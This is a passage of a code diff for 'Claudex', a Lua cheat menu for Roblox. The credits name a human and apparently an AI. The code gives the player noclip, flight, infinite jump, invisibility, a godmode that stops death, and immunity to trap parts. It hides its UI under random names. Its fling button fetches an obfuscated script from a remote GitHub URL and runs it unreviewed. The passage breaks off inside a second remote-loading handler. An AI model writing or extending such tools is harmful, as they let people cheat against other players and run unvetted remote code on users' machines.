+_tgStr.Color = Color3.fromRGB(255, 180, 100)
+_tgStr.Thickness = 1
+_tgStr.Transparency = 0.3
+_tgStr.Parent = _tg
+local _tgGrad = Instance.new("UIGradient")
+_tgGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 150, 80)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 80, 30)),
+})
+_tgGrad.Rotation = 90
+_tgGrad.Parent = _tg
+
+_tg.MouseButton1Click:Connect(function()
+	_open = not _open
+	_tb.Visible = _open and _espOn
+	_mb.Visible = _open and _espOn
+	_rst.Visible = _open
+	if not _open then
+		_lf.Visible = false
+		_mdf.Visible = false
+		if _dopen then
+			_dopen = false
+			pcall(function()
+				TweenService:Create(_dpanel, _tinfo, {Position = UDim2.new(0.5, -150, -1, 0)}):Play()
+				_dtab.Text = "\226\150\188 \226\156\180 Claudex \226\150\188"
+			end)
+		end
+		if _dtab then _dtab.Visible = false end
+	else
+		if _dtab then _dtab.Visible = true end
+	end
+	_tg.Text = ">>>"
+	_tg.BackgroundColor3 = _open and C3_CLAUDEX or Color3.fromRGB(50, 50, 50)
+end)
+
+-- ============ DROPDOWN TOP ============
+
+_dsg = _gui()
+_AT._tsg = _dsg
+_dopen = false
+_noclip = false
+_nccon = nil
+_bright = false
+_brightOG = {}
+
+_dtab = Instance.new("TextButton")
+_dtab.Size = UDim2.new(0, 110, 0, 20)
+_dtab.Position = UDim2.new(0.5, -55, 0, 0)
+_dtab.BackgroundColor3 = C3_CLAUDEX
+_dtab.BackgroundTransparency = 0.2
+_dtab.TextColor3 = Color3.fromRGB(255, 255, 255)
+_dtab.Font = Enum.Font.GothamBold
+_dtab.TextSize = 10
+_dtab.Text = "▼ ✴ Claudex ▼"
+_dtab.Name = _rn()
+_dtab.Parent = _dsg
+Instance.new("UICorner", _dtab).CornerRadius = UDim.new(0, 6)
+local _dtGrad = Instance.new("UIGradient")
+_dtGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 150, 80)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 80, 30)),
+})
+_dtGrad.Rotation = 90
+_dtGrad.Parent = _dtab
+local _dtStroke = Instance.new("UIStroke")
+_dtStroke.Color = Color3.fromRGB(255, 180, 100)
+_dtStroke.Thickness = 1
+_dtStroke.Transparency = 0.3
+_dtStroke.Parent = _dtab
+
+_dpanel = Instance.new("Frame")
+_dpanel.Size = UDim2.new(0, 300, 0, 280)
+_dpanel.Position = UDim2.new(0.5, -150, -1, 0)
+_dpanel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_dpanel.BackgroundTransparency = 0.15
+_dpanel.BorderSizePixel = 0
+_dpanel.ClipsDescendants = true
+_dpanel.Name = _rn()
+_dpanel.Parent = _dsg
+Instance.new("UICorner", _dpanel).CornerRadius = UDim.new(0, 10)
+local _dpStroke = Instance.new("UIStroke")
+_dpStroke.Color = C3_CLAUDEX
+_dpStroke.Thickness = 1.5
+_dpStroke.Transparency = 0.4
+_dpStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+_dpStroke.Parent = _dpanel
+local _dpGrad = Instance.new("UIGradient")
+_dpGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 22, 18)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15)),
+})
+_dpGrad.Rotation = 90
+_dpGrad.Parent = _dpanel
+
+-- Header
+local _dhdr = Instance.new("Frame")
+_dhdr.Size = UDim2.new(1, 0, 0, 28)
+_dhdr.BackgroundTransparency = 1
+_dhdr.Name = _rn()
+_dhdr.Parent = _dpanel
+
+local _dstar = Instance.new("TextLabel")
+_dstar.Size = UDim2.new(0, 28, 0, 28)
+_dstar.BackgroundTransparency = 1
+_dstar.Text = "\226\156\180"
+_dstar.TextColor3 = C3_CLAUDEX
+_dstar.Font = Enum.Font.GothamBold
+_dstar.TextSize = 20
+_dstar.Name = _rn()
+_dstar.Parent = _dhdr
+
+local _dtitle = Instance.new("TextLabel")
+_dtitle.Size = UDim2.new(1, -32, 0, 28)
+_dtitle.Position = UDim2.new(0, 32, 0, 0)
+_dtitle.BackgroundTransparency = 1
+_dtitle.Text = "CLAUDEX"
+_dtitle.TextColor3 = C3_CLAUDEX
+_dtitle.Font = Enum.Font.GothamBold
+_dtitle.TextSize = 14
+_dtitle.TextXAlignment = Enum.TextXAlignment.Left
+_dtitle.Name = _rn()
+_dtitle.Parent = _dhdr
+
+local _dline = Instance.new("Frame")
+_dline.Size = UDim2.new(1, 0, 0, 1)
+_dline.Position = UDim2.new(0, 0, 1, 0)
+_dline.BackgroundColor3 = C3_CLAUDEX
+_dline.BackgroundTransparency = 0.5
+_dline.BorderSizePixel = 0
+_dline.Name = _rn()
+_dline.Parent = _dhdr
+
+-- Tab bar (izquierda)
+local _tabBar = Instance.new("Frame")
+_tabBar.Size = UDim2.new(0, 70, 1, -30)
+_tabBar.Position = UDim2.new(0, 0, 0, 30)
+_tabBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+_tabBar.BackgroundTransparency = 0.3
+_tabBar.BorderSizePixel = 0
+_tabBar.Name = _rn()
+_tabBar.Parent = _dpanel
+
+local _tabBarLL = Instance.new("UIListLayout")
+_tabBarLL.Padding = UDim.new(0, 2)
+_tabBarLL.SortOrder = Enum.SortOrder.LayoutOrder
+_tabBarLL.Parent = _tabBar
+
+local _tabBarPad = Instance.new("UIPadding")
+_tabBarPad.PaddingTop = UDim.new(0, 4)
+_tabBarPad.PaddingLeft = UDim.new(0, 3)
+_tabBarPad.PaddingRight = UDim.new(0, 3)
+_tabBarPad.Parent = _tabBar
+
+-- Tab content (derecha, uno por tab)
+local _tabFrames = {}
+local _tabNames = {"General", "Combate", "Move", "Visual"}
+local _tabColors = {C3_ON, C3_RED, Color3.fromRGB(100, 200, 255), Color3.fromRGB(255, 200, 0)}
+
+for i = 1, #_tabNames do
+	local sf = Instance.new("ScrollingFrame")
+	sf.Size = UDim2.new(1, -74, 1, -30)
+	sf.Position = UDim2.new(0, 74, 0, 30)
+	sf.BackgroundTransparency = 1
+	sf.ScrollBarThickness = 4
+	sf.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+	sf.Visible = (i == 1)
+	sf.Name = _rn()
+	sf.Parent = _dpanel
+	local ll = Instance.new("UIListLayout")
+	ll.Padding = UDim.new(0, 4)
+	ll.SortOrder = Enum.SortOrder.LayoutOrder
+	ll.Parent = sf
+	ll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		sf.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y + 10)
+	end)
+	local pad = Instance.new("UIPadding")
+	pad.PaddingTop = UDim.new(0, 4)
+	pad.PaddingLeft = UDim.new(0, 4)
+	pad.PaddingRight = UDim.new(0, 4)
+	pad.Parent = sf
+	_tabFrames[i] = sf
+end
+
+-- Tab buttons
+local _currentTab = 1
+local _tabBtns = {}
+
+local function _switchTab(idx)
+	_currentTab = idx
+	for i = 1, #_tabFrames do _tabFrames[i].Visible = (i == idx) end
+	for i = 1, #_tabBtns do
+		if i == idx then
+			_tabBtns[i].BackgroundColor3 = _tabColors[i]
+			_tabBtns[i].BackgroundTransparency = 0.3
+			_tabBtns[i].TextColor3 = C3_WHITE
+		else
+			_tabBtns[i].BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+			_tabBtns[i].BackgroundTransparency = 0.3
+			_tabBtns[i].TextColor3 = Color3.fromRGB(130, 130, 130)
+		end
+	end
+end
+
+for i = 1, #_tabNames do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, 0, 0, 28)
+	btn.BackgroundColor3 = (i == 1) and _tabColors[i] or Color3.fromRGB(35, 35, 35)
+	btn.BackgroundTransparency = 0.3
+	btn.TextColor3 = (i == 1) and C3_WHITE or Color3.fromRGB(130, 130, 130)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 9
+	btn.Text = _tabNames[i]
+	btn.LayoutOrder = i
+	btn.Name = _rn()
+	btn.Parent = _tabBar
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+	local ci = i
+	btn.MouseButton1Click:Connect(function() _switchTab(ci) end)
+	_tabBtns[i] = btn
+end
+
+-- Creditos (abajo del tab bar)
+local _credits = Instance.new("TextLabel")
+_credits.Size = UDim2.new(1, 0, 0, 30)
+_credits.Position = UDim2.new(0, 0, 1, -30)
+_credits.BackgroundTransparency = 1
+_credits.Text = "Eidanex\n& Claude Mythos"
+_credits.TextColor3 = Color3.fromRGB(90, 90, 90)
+_credits.Font = Enum.Font.Gotham
+_credits.TextSize = 8
+_credits.Name = _rn()
+_credits.Parent = _dpanel
+
+-- Builder: tab 1=General 2=Combate 3=Move 4=Visual
+local _btnHoverInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local function _dbtn(txt, order, tab)
+	local b = Instance.new("TextButton")
+	b.Size = UDim2.new(1, 0, 0, 30)
+	b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	b.BackgroundTransparency = 0.25
+	b.TextColor3 = C3_OFF
+	b.Font = Enum.Font.GothamBold
+	b.TextSize = 11
+	b.Text = txt
+	b.AutoButtonColor = false
+	b.LayoutOrder = order
+	b.Name = _rn()
+	b.Parent = _tabFrames[tab or 1]
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+	local st = Instance.new("UIStroke")
+	st.Color = Color3.fromRGB(90, 90, 90)
+	st.Thickness = 1
+	st.Transparency = 0.6
+	st.Parent = b
+	b.MouseEnter:Connect(function()
+		TweenService:Create(b, _btnHoverInfo, {BackgroundTransparency = 0.05}):Play()
+		TweenService:Create(st, _btnHoverInfo, {Transparency = 0.1, Color = C3_CLAUDEX}):Play()
+	end)
+	b.MouseLeave:Connect(function()
+		TweenService:Create(b, _btnHoverInfo, {BackgroundTransparency = 0.25}):Play()
+		TweenService:Create(st, _btnHoverInfo, {Transparency = 0.6, Color = Color3.fromRGB(90, 90, 90)}):Play()
+	end)
+	return b
+end
+
+_ncb = _dbtn("NOCLIP: OFF", 1, 1)
+_brb = _dbtn("LUZ: OFF", 2, 1)
+_dsb = _dbtn("DESLIZAMIENTO: OFF", 3, 1)
+_grb = _dbtn("GRAVEDAD 0: OFF", 6, 1)
+
+-- JERK (BindToRenderStep, prioridad Character+1 para overridear Animator)
+local _jerkBtn = _dbtn("JERK: OFF", 5, 1)
+
+local function _startJerk()
+	local char = LP.Character
+	if not char then return false end
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	local animScript = char:FindFirstChild("Animate")
+	if animScript then pcall(function() animScript.Disabled = true end) end
+	if hum then
+		pcall(function()
+			local animator = hum:FindFirstChildOfClass("Animator") or hum
+			for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+				pcall(function() track:Stop(0) end)
+			end
+		end)
+	end
+	local isR15 = char:FindFirstChild("UpperTorso") ~= nil
+	local rUA = char:FindFirstChild("RightUpperArm")
+	local rLA = char:FindFirstChild("RightLowerArm")
+	local rShoulder15 = rUA and rUA:FindFirstChild("RightShoulder")
+	local rElbow15 = rLA and rLA:FindFirstChild("RightElbow")
+	local torso = char:FindFirstChild("Torso")
+	local rShoulder6 = torso and torso:FindFirstChild("Right Shoulder")
+	local t = 0
+	local prio = (Enum.RenderPriority and Enum.RenderPriority.Character and Enum.RenderPriority.Character.Value or 300) + 1
+	local ok = pcall(function()
+		RS:BindToRenderStep(_jerkBindName, prio, function()
+			if not _jerkOn then return end
+			t = t + 0.35
+			if isR15 then
+				if rShoulder15 and rShoulder15.Parent then
+					rShoulder15.Transform = CFrame.Angles(math.rad(65), 0, math.rad(18))
+				end
+				if rElbow15 and rElbow15.Parent then
+					rElbow15.Transform = CFrame.Angles(math.rad(20) + msin(t) * math.rad(25), 0, 0)
+				end
+			else
+				if rShoulder6 and rShoulder6.Parent then
+					rShoulder6.Transform = CFrame.Angles(math.rad(60) + msin(t) * math.rad(25), 0, math.rad(-15))
+				end
+			end
+		end)
+	end)
+	return ok
+end
+
+local function _stopJerk()
+	pcall(function() RS:UnbindFromRenderStep(_jerkBindName) end)
+	local char = LP.Character
+	if char then
+		local animScript = char:FindFirstChild("Animate")
+		if animScript then pcall(function() animScript.Disabled = false end) end
+	end
+end
+
+_jerkBtn.MouseButton1Click:Connect(function()
+	_jerkOn = not _jerkOn
+	_jerkBtn.Text = _jerkOn and "JERK: ON" or "JERK: OFF"
+	_jerkBtn.TextColor3 = _jerkOn and C3_ON or C3_OFF
+	if _jerkOn then
+		if not _startJerk() then
+			_jerkOn = false
+			_jerkBtn.Text = "JERK: OFF"
+			_jerkBtn.TextColor3 = C3_OFF
+		end
+	else
+		_stopJerk()
+	end
+end)
+
+-- INVI ON/OFF (Visual tab)
+_ivL = _dbtn("INVI: OFF", 3, 4)
+_ivL.MouseButton1Click:Connect(function()
+	_toggleInvis()
+end)
+
+-- ANTI-RAG (godmode + anti-ragdoll + anti-sit forzado)
+local _arb = _dbtn("ANTI-RAG: OFF", 1, 2)
+
+_clearAntiRag = function()
+	for _, c in ipairs(_antiRagCons) do pcall(function() c:Disconnect() end) end
+	_antiRagCons = {}
+end
+
+local function _applyAntiRag(hum)
+	if not hum then return end
+	pcall(function() hum.BreakJointsOnDeath = false end)
+	pcall(function() hum.AutoRotate = true end)
+	pcall(function() hum.PlatformStand = false end)
+
+	tinsert(_antiRagCons, hum.HealthChanged:Connect(function(hp)
+		if _antiRag and hp <= 0 then hum.Health = 1 end
+	end))
+
+	tinsert(_antiRagCons, hum:GetPropertyChangedSignal("AutoRotate"):Connect(function()
+		if _antiRag and not hum.AutoRotate then hum.AutoRotate = true end
+	end))
+
+	tinsert(_antiRagCons, hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
+		if _antiRag and hum.PlatformStand then hum.PlatformStand = false end
+	end))
+
+	tinsert(_antiRagCons, RS.RenderStepped:Connect(function()
+		if _antiRag and hum.Sit and not hum.SeatPart then hum.Sit = false end
+	end))
+end
+
+local function _toggleAntiRag()
+	_antiRag = not _antiRag
+	_arb.Text = _antiRag and "ANTI-RAG: ON" or "ANTI-RAG: OFF"
+	_arb.TextColor3 = _antiRag and C3_ON or C3_OFF
+	if _antiRag then
+		if _AT._rag.on and _AT._rag.disable then _AT._rag.disable() end
+		local ch = LP.Character
+		if ch then _applyAntiRag(ch:FindFirstChildOfClass("Humanoid")) end
+		_antiRagCharCon = LP.CharacterAdded:Connect(function(c)
+			if not _antiRag then return end
+			local h = c:WaitForChild("Humanoid", 5)
+			if h then _applyAntiRag(h) end
+		end)
+	else
+		if _antiRagCharCon then _antiRagCharCon:Disconnect(); _antiRagCharCon = nil end
+		_clearAntiRag()
+	end
+end
+
+_arb.MouseButton1Click:Connect(_toggleAntiRag)
+
+-- FLING (motor externo FE, igual que INVI)
+local _flb = _dbtn("FLING: OFF", 2, 2)
+
+_flb.MouseButton1Click:Connect(function()
+	if _AT._flingBusy then return end
+	_AT._flingBusy = true
+	_fling = not _fling
+	_flb.Text = _fling and "FLING: ON" or "FLING: OFF"
+	_flb.TextColor3 = _fling and C3_ON or C3_OFF
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
+	end)
+	_AT._flingBusy = false
+end)
+
+-- FLY (estilo LINHMC V4: ControlModule + Lerp + anti-sit + anti-animations)
+-- Mobile y PC, sin noclip incluido (NOCLIP esta aparte como feature)
+_fyb = _dbtn("FLY: OFF", 1, 3)
+
+local _flyLastLook = Vector3.new(0, 0, -1)
+local _flyRotSpd = 0.12
+
+local function _isFlyMoveAnim(id)
+	if not id then return false end
+	local ids = {"180436334", "180436148", "125750702", "180435571", "180435792"}
+	for _, s in ipairs(ids) do
+		if id:find(s) then return true end
+	end
+	return false
+end
+
+local function _getCtrlMod()
+	local ok, cm = pcall(function()
+		local ps = LP:FindFirstChild("PlayerScripts")
+		if not ps then return nil end
+		local pm = ps:FindFirstChild("PlayerModule")
+		if not pm then return nil end
+		local c = pm:FindFirstChild("ControlModule")
+		if not c then return nil end
+		return require(c)
+	end)
+	if ok then return cm end
+	return nil
+end
+
+local function _flyPreventSit(hum)
+	if _flyStateCon then pcall(function() _flyStateCon:Disconnect() end); _flyStateCon = nil end
+	if not hum then return end
+	_flyStateCon = hum.StateChanged:Connect(function(old, new)
+		if not _flyOn then return end
+		if new == Enum.HumanoidStateType.Seated then
+			task.spawn(function()
+				task.wait(0.1)
+				if _flyOn and hum.Parent then
+					pcall(function()
+						hum:ChangeState(Enum.HumanoidStateType.Running)
+						hum.PlatformStand = true
+					end)
+				end
+			end)
+		end
+	end)
+end
+
+local function _flyHandleAnims(hum)
+	if _flyAnimCon then pcall(function() _flyAnimCon:Disconnect() end); _flyAnimCon = nil end
+	if not hum then return end
+	_flyAnimCon = hum.AnimationPlayed:Connect(function(track)
+		if not _flyOn then return end
+		if track.Animation and track.Animation.AnimationId then
+			if _isFlyMoveAnim(track.Animation.AnimationId) then
+				pcall(function() track:Stop() end)
+			end
+		end
+	end)
+end
+
+local function _startFly()
+	local ch = LP.Character
+	if not ch then return false end
+	local hrp = ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChild("Torso")
+	if not hrp then return false end
+	local hum = ch:FindFirstChildOfClass("Humanoid")
+
+	if _flyBV then pcall(function() _flyBV:Destroy() end); _flyBV = nil end
+	if _flyGyro then pcall(function() _flyGyro:Destroy() end); _flyGyro = nil end
+
+	_flyBV = Instance.new("BodyVelocity")
+	_flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+	_flyBV.Velocity = V3_ZERO
+	_flyBV.Name = _rn()
+	_flyBV.Parent = hrp
+
+	_flyGyro = Instance.new("BodyGyro")
+	_flyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+	_flyGyro.P = 1e4
+	_flyGyro.CFrame = hrp.CFrame
+	_flyGyro.Name = _rn()
+	_flyGyro.Parent = hrp
+
+	if hum then
+		pcall(function()
+			for _, tr in ipairs(hum:GetPlayingAnimationTracks()) do
+				if tr.Animation and tr.Animation.AnimationId and _isFlyMoveAnim(tr.Animation.AnimationId) then
+					pcall(function() tr:Stop() end)
+				end
+			end
+		end)
+		pcall(function() hum.PlatformStand = true end)
+		_flyPreventSit(hum)
+		_flyHandleAnims(hum)
+	end
+
+	local cm = _getCtrlMod()
+	local cam = workspace.CurrentCamera
+	_flyLastLook = cam.CFrame.LookVector
+
+	_flyCon = RS.Heartbeat:Connect(function()
+		if not _flyOn then return end
+		local cch = LP.Character
+		if not cch then return end
+		local cHrp = cch:FindFirstChild("HumanoidRootPart") or cch:FindFirstChild("Torso")
+		if not cHrp or not cHrp.Parent then return end
+		local cHum = cch:FindFirstChildOfClass("Humanoid")
+		if cHum and not cHum.PlatformStand then pcall(function() cHum.PlatformStand = true end) end
+
+		local cm2 = cm or _getCtrlMod()
+		local mv = V3_ZERO
+		if cm2 then
+			local ok, mvec = pcall(function() return cm2:GetMoveVector() end)
+			if ok and mvec then mv = mvec end
+		end
+		-- fallback PC desktop WASD
+		if UIS:IsKeyDown(Enum.KeyCode.W) then mv = mv + Vector3.new(0, 0, -1) end
+		if UIS:IsKeyDown(Enum.KeyCode.S) then mv = mv + Vector3.new(0, 0, 1) end
+		if UIS:IsKeyDown(Enum.KeyCode.A) then mv = mv + Vector3.new(-1, 0, 0) end
+		if UIS:IsKeyDown(Enum.KeyCode.D) then mv = mv + Vector3.new(1, 0, 0) end
+
+		local vert = 0
+		if UIS:IsKeyDown(Enum.KeyCode.Space) then vert = vert + 1 end
+		if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then vert = vert - 1 end
+
+		local cam2 = workspace.CurrentCamera
+		local target = V3_ZERO
+		if mv.Magnitude > 0 then
+			local dir = cam2.CFrame:VectorToWorldSpace(mv)
+			target = dir.Unit * _flySpd
+		end
+		if vert ~= 0 then
+			target = target + Vector3.new(0, vert * _flySpd, 0)
+		end
+		if _flyBV and _flyBV.Parent then
+			_flyBV.Velocity = _flyBV.Velocity:Lerp(target, 0.25)
+		end
+		if _flyGyro and _flyGyro.Parent then
+			local curLook = cam2.CFrame.LookVector
+			_flyLastLook = _flyLastLook:Lerp(curLook, _flyRotSpd)
+			_flyGyro.CFrame = CFrame.lookAt(cHrp.Position, cHrp.Position + _flyLastLook)
+		end
+		if target.Magnitude == 0 and _flyBV and _flyBV.Velocity.Magnitude < 0.5 then
+			_flyBV.Velocity = V3_ZERO
+			pcall(function() cHrp.AssemblyLinearVelocity = V3_ZERO end)
+		end
+	end)
+	return true
+end
+
+local function _stopFly()
+	if _flyCon then pcall(function() _flyCon:Disconnect() end); _flyCon = nil end
+	if _flyStateCon then pcall(function() _flyStateCon:Disconnect() end); _flyStateCon = nil end
+	if _flyAnimCon then pcall(function() _flyAnimCon:Disconnect() end); _flyAnimCon = nil end
+	if _flyBV then pcall(function() _flyBV:Destroy() end); _flyBV = nil end
+	if _flyGyro then pcall(function() _flyGyro:Destroy() end); _flyGyro = nil end
+	local ch = LP.Character
+	if ch then
+		local hum = ch:FindFirstChildOfClass("Humanoid")
+		local hrp = ch:FindFirstChild("HumanoidRootPart") or ch:FindFirstChild("Torso")
+		if hum then
+			pcall(function() hum.PlatformStand = false end)
+			pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
+		end
+		if hrp then
+			pcall(function() hrp.AssemblyLinearVelocity = V3_ZERO end)
+			pcall(function() hrp.AssemblyAngularVelocity = V3_ZERO end)
+		end
+	end
+end
+
+_fyb.MouseButton1Click:Connect(function()
+	_flyOn = not _flyOn
+	_fyb.Text = _flyOn and "FLY: ON" or "FLY: OFF"
+	_fyb.TextColor3 = _flyOn and C3_ON or C3_OFF
+	if _flyOn then
+		if not _startFly() then
+			_flyOn = false
+			_fyb.Text = "FLY: OFF"
+			_fyb.TextColor3 = C3_OFF
+		end
+	else
+		_stopFly()
+	end
+end)
+
+-- INF JUMP (salto infinito)
+local _ijb = _dbtn("INF JUMP: OFF", 2, 3)
+
+_ijb.MouseButton1Click:Connect(function()
+	_infJump = not _infJump
+	_ijb.Text = _infJump and "INF JUMP: ON" or "INF JUMP: OFF"
+	_ijb.TextColor3 = _infJump and C3_ON or C3_OFF
+	if _infJump then
+		_ijCon = UIS.JumpRequest:Connect(function()
+			if not _infJump then return end
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then
+				hum:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end)
+	else
+		if _ijCon then _ijCon:Disconnect(); _ijCon = nil end
+	end
+end)
+
+-- FPS BOOST (mata sombras, particulas, efectos visuales)
+_fpbb = _dbtn("FPS BOOST: OFF", 1, 4)
+
+local function _toggleFpsBoost()
+	_AT._fpsBoost = not _AT._fpsBoost
+	_fpbb.Text = _AT._fpsBoost and "FPS BOOST: ON" or "FPS BOOST: OFF"
+	_fpbb.TextColor3 = _AT._fpsBoost and C3_ON or C3_OFF
+	if _AT._fpsBoost then
+		_fpsOG = {
+			gs = Lighting.GlobalShadows,
+			gi = Lighting.GlobalIllumination,
+			eb = Lighting.EnvironmentDiffuseScale,
+			es = Lighting.EnvironmentSpecularScale,
+		}
+		pcall(function() Lighting.GlobalShadows = false end)
+		pcall(function() Lighting.GlobalIllumination = 0 end)
+		pcall(function() Lighting.EnvironmentDiffuseScale = 0 end)
+		pcall(function() Lighting.EnvironmentSpecularScale = 0 end)
+		pcall(function() settings().Rendering.QualityLevel = 1 end)
+		_fpsDisabled = {}
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if (v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("Explosion")) and v.Enabled then
+				v.Enabled = false
+				tinsert(_fpsDisabled, v)
+			end
+		end
+		for _, v in ipairs(Lighting:GetDescendants()) do
+			if (v:IsA("BloomEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("BlurEffect")) and v.Enabled then
+				v.Enabled = false
+				tinsert(_fpsDisabled, v)
+			end
+		end
+		pcall(function()
+			local t = workspace:FindFirstChildOfClass("Terrain")
+			if t then
+				_fpsOG.wws = t.WaterWaveSize
+				_fpsOG.wr = t.WaterReflectance
+				_fpsOG.wt = t.WaterTransparency
+				_fpsOG.dec = t.Decoration
+				t.WaterWaveSize = 0
+				t.WaterReflectance = 0
+				t.WaterTransparency = 1
+				t.Decoration = false
+			end
+		end)
+	else
+		pcall(function() Lighting.GlobalShadows = _fpsOG.gs ~= nil and _fpsOG.gs or true end)
+		pcall(function() if _fpsOG.gi then Lighting.GlobalIllumination = _fpsOG.gi end end)
+		pcall(function() if _fpsOG.eb then Lighting.EnvironmentDiffuseScale = _fpsOG.eb end end)
+		pcall(function() if _fpsOG.es then Lighting.EnvironmentSpecularScale = _fpsOG.es end end)
+		pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic end)
+		for _, v in ipairs(_fpsDisabled) do pcall(function() v.Enabled = true end) end
+		_fpsDisabled = {}
+		pcall(function()
+			local t = workspace:FindFirstChildOfClass("Terrain")
+			if t then
+				if _fpsOG.wws then t.WaterWaveSize = _fpsOG.wws end
+				if _fpsOG.wr then t.WaterReflectance = _fpsOG.wr end
+				if _fpsOG.wt then t.WaterTransparency = _fpsOG.wt end
+				t.Decoration = _fpsOG.dec ~= nil and _fpsOG.dec or true
+			end
+		end)
+	end
+end
+_fpbb.MouseButton1Click:Connect(_toggleFpsBoost)
+
+-- ANTI-TOUCH (inmunidad a killbricks y trampas)
+_atb = _dbtn("ANTI-TOUCH: OFF", 3, 2)
+
+do
+local function _toggleAntiTouch()
+	_AT._antiTouch = not _AT._antiTouch
+	_atb.Text = _AT._antiTouch and "ANTI-TOUCH: ON" or "ANTI-TOUCH: OFF"
+	_atb.TextColor3 = _AT._antiTouch and C3_ON or C3_OFF
+	if _AT._antiTouch then
+		_atCon = RS.Heartbeat:Connect(function()
+			if not _AT._antiTouch then return end
+			if _tick % 3 ~= 0 then return end
+			local ch = LP.Character
+			if not ch then return end
+			local hrp = ch:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+			pcall(function()
+				local parts = workspace:GetPartBoundsInRadius(hrp.Position, 15)
+				for _, p in ipairs(parts) do
+					if not p:IsDescendantOf(ch) then p.CanTouch = false end
+				end
+			end)
+		end)
+	else
+		if _atCon then _atCon:Disconnect(); _atCon = nil end
+	end
+end
+_atb.MouseButton1Click:Connect(_toggleAntiTouch)
+end
+
+-- RAGDOLL (como gravedad 0 pero con gravedad normal — char limp cayendo)
+do
+	local _rgb = _dbtn("RAGDOLL: OFF", 4, 2)
+	_AT._rag.btn = _rgb
+	local function _applyRagdoll(on)
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if not hum then return end
+			if on then
+				hum.PlatformStand = true
+				hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Landed, false)
+				hum:ChangeState(Enum.HumanoidStateType.Physics)
+				local anim = LP.Character:FindFirstChild("Animate")
+				if anim then anim.Disabled = true end
+				for _, tr in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() tr:AdjustSpeed(0) end) end
+			else
+				hum.PlatformStand = false
+				hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+				hum:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
+				hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+				local anim = LP.Character:FindFirstChild("Animate")
+				if anim then anim.Disabled = false end
+			end
+		end)
+	end
+	_AT._rag.disable = function()
+		_AT._rag.on = false
+		_rgb.Text = "RAGDOLL: OFF"
+		_rgb.TextColor3 = C3_OFF
+		if _AT._rag.con then _AT._rag.con:Disconnect(); _AT._rag.con = nil end
+		_applyRagdoll(false)
+	end
+	local function _toggleRagdoll()
+		_AT._rag.on = not _AT._rag.on
+		_rgb.Text = _AT._rag.on and "RAGDOLL: ON" or "RAGDOLL: OFF"
+		_rgb.TextColor3 = _AT._rag.on and C3_ON or C3_OFF
+		if _AT._rag.on then
+			if _antiRag then _toggleAntiRag() end
+			_applyRagdoll(true)
+			_AT._rag.con = RS.Heartbeat:Connect(function()
+				if not _AT._rag.on then return end
+				if _tick % 20 ~= 0 then return end
+				local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+				if hum and not hum.PlatformStand then hum.PlatformStand = true end
+			end)
+		else
+			if _AT._rag.con then _AT._rag.con:Disconnect(); _AT._rag.con = nil end
+			_applyRagdoll(false)
+		end
+	end
+	_rgb.MouseButton1Click:Connect(_toggleRagdoll)
+end
+
+-- TORNADO (script externo via loadstring, boton de accion no toggle)
+do
+	local _tornBtn = _dbtn("TORNADO", 5, 2)
+	_tornBtn.TextColor3 = C3_CLAUDEX
+	local _tornBusy = false
+	_tornBtn.MouseButton1Click:Connect(function()
+		if _tornBusy then return end
+		_tornBusy = true
+		_tornBtn.TextColor3 = C3_ON
+		pcall(function()
